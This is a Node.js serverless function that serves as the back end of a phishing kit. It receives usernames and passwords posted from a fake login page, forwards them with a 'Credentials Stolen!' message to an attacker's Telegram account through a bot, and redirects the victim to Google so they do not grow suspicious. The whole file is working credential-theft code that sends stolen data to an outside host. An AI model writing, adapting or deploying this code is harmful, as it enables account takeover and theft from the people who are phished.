const { send } = require('micro');
const { parse } = require('url');
const microBody = require('micro-body'); // Used to parse form data from the request body
const { Telegraf } = require('telegraf'); // Telegraf needs to be initialized in each function

// Re-initialize Telegraf bot here as each Vercel function runs in isolation.
const bot = new Telegraf(process.env.BOT_TOKEN);

// This serverless function receives the submitted username and password.
module.exports = async (req, res) => {
    // Ensure it's a POST request
    if (req.method !== 'POST') {
        return send(res, 405, 'Method Not Allowed');
    }

    // Extract the uniqueId from the URL path
    const { pathname } = parse(req.url);
    const uniqueId = pathname.split('/').pop();

    // Parse the form data (URL-encoded) from the request body
    const body = await microBody(req);
    const username = body.username;
    const password = body.password;

    // Get the target Telegram User ID from environment variables
    const TARGET_USER_ID = process.env.TARGET_TELEGRAM_USER_ID;

    if (!TARGET_USER_ID) {
        console.error('TARGET_TELEGRAM_USER_ID environment variable is not set. Credentials will not be forwarded.');
    } else {
        try {
            // Send the stolen credentials to the specified Telegram user
            await bot.telegram.sendMessage(
                TARGET_USER_ID,
                `‼️ **Credentials Stolen!** ‼️\n\n**Link ID:** \`${uniqueId}\`\n**Username:** \`${username}\`\n**Password:** \`${password}\``,
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            console.error('Error sending credentials to Telegram:', error);
            // Log full error for debugging
            if (error.response && error.response.error_code) {
                console.error(`Telegram API Error: ${error.response.error_code} - ${error.response.description}`);
            }
        }
    }

    // Redirect the victim to a legitimate site (e.g., Google) to avoid suspicion.
    res.setHeader('Location', 'https://www.google.com');
    send(res, 302, 'Redirecting...');
};
